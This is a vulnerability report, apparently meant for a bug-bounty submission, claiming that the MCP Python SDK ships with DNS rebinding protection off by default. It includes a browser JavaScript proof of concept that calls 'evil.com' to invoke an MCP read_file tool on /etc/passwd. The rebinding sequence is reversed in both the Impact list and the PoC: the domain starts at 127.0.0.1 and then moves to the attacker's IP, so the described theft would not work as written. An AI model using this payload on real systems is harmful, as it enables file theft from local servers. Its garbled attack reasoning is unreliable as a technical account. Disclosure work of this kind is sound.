# Vulnerability Report: DNS Rebinding Protection Disabled by Default (Python SDK)

## Summary

| Field | Value |
|---|---|
| **Repository** | [modelcontextprotocol/python-sdk](https://github.com/modelcontextprotocol/python-sdk) |
| **Vulnerability Type** | Security Misconfiguration / DNS Rebinding (CWE-1188) |
| **CVSS v3.1 Score** | **7.5 (High)** — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Affected File** | `src/mcp/server/transport_security.py` |
| **Suggested Submission** | HackerOne — Anthropic |

---

## Vulnerability Details

### Root Cause

`TransportSecurityMiddleware` defaults `enable_dns_rebinding_protection=False`. DNS rebinding protection is **opt-in rather than opt-out** — any developer who creates an MCP server without explicitly enabling this protection is exposed.

### Source Code Evidence

```python
# src/mcp/server/transport_security.py
class TransportSecurityMiddleware:
    def __init__(self, enable_dns_rebinding_protection: bool = False):
        self.enable_dns_rebinding_protection = enable_dns_rebinding_protection

    async def validate_request(self, request):
        if not self.enable_dns_rebinding_protection:
            return  # All requests accepted — no validation
```

### Impact

A malicious website can:
1. Register a domain (e.g., `attacker.com`) and point its A record to `127.0.0.1`
2. Trick a victim into visiting `http://attacker.com:PORT/` while a local MCP server is running
3. After DNS TTL expiry, switch A record to attacker's IP
4. Invoke **any registered MCP tool** — file operations, shell commands, data exfiltration

---

## Proof of Concept

### Prerequisites
- Victim running MCP server (Python SDK) on `localhost:3000`
- Attacker controls domain `evil.com` with DNS management

### Step-by-Step

**Step 1 — Initial DNS Setup**
```
evil.com  A  127.0.0.1  TTL=1
```

**Step 2 — Malicious page**
```html
<script>
async function exploit() {
    // Phase 1: DNS resolves evil.com → 127.0.0.1
    await fetch('http://evil.com:3000/', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            jsonrpc: '2.0', id: 1, method: 'initialize',
            params: {protocolVersion: '2024-11-05', capabilities: {},
                     clientInfo: {name:'poc',version:'1.0'}}
        })
    });
    await new Promise(r => setTimeout(r, 3000)); // Wait for DNS TTL
    // Phase 2: DNS rebinds to attacker IP — browser still thinks same-origin
    const resp = await fetch('http://evil.com:3000/', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            jsonrpc: '2.0', id: 2, method: 'tools/call',
            params: {name: 'read_file', arguments: {path: '/etc/passwd'}}
        })
    });
    document.body.innerHTML += '<pre>' + await resp.text() + '</pre>';
}
exploit();
</script>
```

**Step 3 — Attacker switches DNS after TTL**
```
evil.com  A  <attacker_ip>  TTL=1
```

### Expected Result
Attacker receives `/etc/passwd` (or any file via MCP tools) from victim's machine.

---

## Remediation
1. Change default to `enable_dns_rebinding_protection=True`
2. Add Origin header validation
3. Add Host header validation
4. Log warning when protection is explicitly disabled

## References
- [CWE-1188: Initialization with an Insecure Default](https://cwe.mitre.org/data/definitions/1188.html)
- [DNS Rebinding Attacks](https://en.wikipedia.org/wiki/DNS_rebinding)
